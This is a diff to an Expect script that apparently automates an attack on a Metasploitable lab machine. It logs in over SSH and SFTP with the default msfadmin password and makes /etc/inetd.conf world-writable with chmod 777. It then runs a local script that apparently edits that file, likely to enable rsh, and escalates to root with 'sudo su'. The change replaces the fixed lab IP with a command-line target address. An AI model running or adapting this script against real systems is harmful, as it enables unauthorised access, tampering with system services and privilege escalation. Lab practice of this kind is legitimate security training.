@@ -5,15 +5,16 @@ set timeout 5
 set connected false
 set passwordUsed ""
 set idx 1
+set ipaddr [lindex $argv 0]
 
-spawn ssh -oHostKeyAlgorithms=+ssh-dss msfadmin@192.168.1.181 -y
+eval spawn ssh -oHostKeyAlgorithms=+ssh-dss msfadmin@$ipaddr -y
 expect "assword:" {send -- "msfadmin\r"}
 expect "msfadmin@metasploitable:" {send -- "cd /etc\r"}
 send -- "sudo chmod 777 inetd.conf\r"
 expect "msfadmin:" {send -- "msfadmin\r"}
 
 expect eof
-spawn sftp -oHostKeyAlgorithms=+ssh-dss msfadmin@192.168.1.181 -y
+eval spawn sftp -oHostKeyAlgorithms=+ssh-dss msfadmin@$ipaddr -y
 
 expect "assword:" {send -- "msfadmin\r"}
 expect {
@@ -26,7 +27,7 @@ expect {
 expect eof
 exec python _Logan/rsh/rsh-edit.py
 
-spawn sftp -oHostKeyAlgorithms=+ssh-dss msfadmin@192.168.1.181 -y
+eval spawn sftp -oHostKeyAlgorithms=+ssh-dss msfadmin@$ipaddr -y
 expect "assword:" {send -- "msfadmin\r"}
 expect {
     "sftp>" {
@@ -36,7 +37,7 @@ expect {
     }
 }
 expect eof
-spawn ssh -oHostKeyAlgorithms=+ssh-dss msfadmin@192.168.1.181 -y
+eval spawn ssh -oHostKeyAlgorithms=+ssh-dss msfadmin@$ipaddr -y
 expect "assword:" {send -- "msfadmin\r"}
 expect "msfadmin@metasploitable:" {send -- "sudo su\r"}
 expect "msfadmin:" {send -- "msfadmin\r"}
